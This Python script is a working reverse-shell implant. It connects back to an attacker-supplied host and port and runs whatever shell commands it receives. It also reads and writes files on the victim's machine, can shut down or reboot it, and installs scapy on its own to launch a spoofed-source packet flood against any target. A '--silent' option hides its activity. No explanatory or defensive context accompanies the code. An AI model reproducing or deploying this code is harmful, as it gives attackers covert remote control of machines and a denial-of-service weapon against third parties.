import socket
import subprocess
import threading
import os
import sys
import logging

class bcolors:
    WHITE = '\033[90m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PINK = '\033[95m'
    CYAN = '\033[96m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

BUFFER_SIZE = 4096
target_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


# connects with the attacker 
def target_client_connector():
    # connect to the attacker
    HOST = str(sys.argv[1])
    PORT = int(sys.argv[2])
    attacker_hostname = HOST
    attacker_port = PORT
    while(True):
        success = target_client.connect_ex((attacker_hostname, attacker_port))
        if(not success):
            # connection established successfully
            break



def send_data(data):
    # receive data from the attacker server
    target_client.send(bytes(data, 'utf-8'))



def receive_data():
    # receive data from the attacker server
    response = ""
    while True:
        received_data = target_client.recv(BUFFER_SIZE)
        received_data = received_data.decode('utf-8')
        response = response + str(received_data)
        if(len(received_data) < BUFFER_SIZE):
            break

    if ("--silent" not in sys.argv):
        print("Received: " + response)

    # acknowledge receiving the data
    send_data("ACK")

    # do something on the data
    
    output = run_command(response)
    try:
        output = output.decode('utf-8')
    except:
        pass
    # send result back
    send_data(output)



def navigate_directory(command):
    destination_directory_path = command[command.index("cd") + 3:]

    if ("--silent" not in sys.argv):
        print(destination_directory_path)

    os.chdir(destination_directory_path)



#   commands of the form:
#   file    name_of_file   r/w/rw/a 
#   do NOT create a file if it does not previously exist
def file_handler(command):
    command_splits = command.split(" ")
    if(len(command_splits) > 3):
        return "file command has more than two arguments."
    
    elif(command_splits[0] != 'file'):
        return "incorrect command"
    
    file_name = command_splits[1]
    mode = command_splits[2]

    try:
        file_object = open(file_name, mode)
    except Exception as e:
        return str(e)
    

    if(mode == 'r'):
        data_read = file_object.read()
        file_object.close()
        return data_read
    
    elif(mode == 'w' or mode == 'a'):
        response = ""
        while True:
            received_data = target_client.recv(BUFFER_SIZE)
            received_data = received_data.decode('utf-8')
            if(received_data == "FILE_UPDATE_QUIT"):
                break
            response = response + str(received_data) + "\n"
        file_object.write(response)
        file_object.close()
        return "Data written successfully"



def special_command_dos(sourceIp, sourcePort, targetIp, targetPort):
    try: 
        import scapy
    except ModuleNotFoundError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "scapy"])
        try:
            import scapy
        except ModuleNotFoundError:
            return f"{bcolors.RED}Failed: Unable to install missing module 'scapy'{bcolors.ENDC}"

    def send_dos_packets():
        from scapy.all import IP,TCP,send
        while True:
           IP1 = IP(src = sourceIp, dst = targetIp)
           TCP1 = TCP(sport = int(sourcePort), dport = int(targetPort))
           pkt = IP1 / TCP1
           send(pkt, inter = .001)


    logging.getLogger("scapy").setLevel(logging.ERROR)

    thread = threading.Thread(target=send_dos_packets)
    thread.start()

    return 0

def special_command_shutdown():
    return os.system("shutdown /s /t 1")

def special_command_reboot():
    return os.system("shutdown /r /t 1")



def handle_special_command(command):
    originalCommand = command # backup of original command
    command = command[2:] # removes '--'' at beginning

    if command.startswith("dos"):
        command = command[4:] # removed 'dos' to keep only arguments
        try:
            sourceIp, sourcePort, targetIp, targetPort = command.split()
        except Exception:
            return f"{bcolors.RED}Missing arguments, ensure to provide sourceIp, sourcePort, targetIp, targetPort{bcolors.ENDC}"

        result = special_command_dos(sourceIp, sourcePort, targetIp, targetPort)
        if result == 0:
            return "Command '" + originalCommand + "' executed successfully"
        return result

    elif command == "shutdown":
        result = special_command_shutdown()
        if result == 256:
            return f"{bcolors.RED}Failed. You need to be super-user on the target to do that.{bcolors.ENDC}"
        else:
            return "Special command SHUTDOWN"

    elif command == "reboot":
        result = special_command_reboot()
        if result == 256:
            return f"{bcolors.RED}Failed. You need to be super-user on the target to do that.{bcolors.ENDC}"
        else:
            return "Special command REBOOT"



def run_command(command):

    command = command.rstrip()

    # Manage special commands
    if command.startswith("--"):
        return handle_special_command(command)

    # Folders navigation
    try:
        command.index("cd")
        navigate_directory(command)
        return "Directory changed to: " + str(os.getcwd())
    except:
        pass

    # File uploads
    try:
        command.index("file")
        output = file_handler(command)
        return output
    except:
        pass
    
    # Other any command
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
        if not output:
            output = "Command '" + command + "' executed successfully"
    except Exception as e:
        output = "Failed to execute command " + str(e)
    return output


def main():
    # connect to the attacker
    target_client_connector()
    while True:
        receive_data()

main()